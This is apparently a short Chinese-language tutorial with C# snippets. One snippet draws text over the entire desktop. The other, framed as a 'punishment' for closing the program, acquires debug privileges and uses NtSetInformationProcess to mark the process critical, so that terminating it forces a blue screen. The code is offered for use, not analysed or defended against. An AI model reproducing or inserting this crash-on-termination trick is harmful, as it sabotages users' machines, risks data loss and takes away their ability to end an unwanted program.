## 在整个桌面绘制
```csharp
//绘画引用
[DllImport("user32.dll")]
public static extern IntPtr GetDesktopWindow();

[DllImport("user32.dll")]
public static extern IntPtr GetWindowDC(IntPtr hwnd);

//得到桌面环境
var screen = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()));

screen.DrawString(mesg, Font, Color, point);//开始画画，此部分是绘制文本
```
---
## 防止程序被结束
- 这必须给一点小小的惩罚
```csharp
//窗体被关闭就蓝屏
//添加System.Runtime.InteropServices和System.Diagnostics的引用
 
//声明引用
[DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        //窗体关闭事件，在窗体事件中的FormClosing
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
 
            Process.EnterDebugMode();  //acquire Debug Privileges
 
            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
 
        }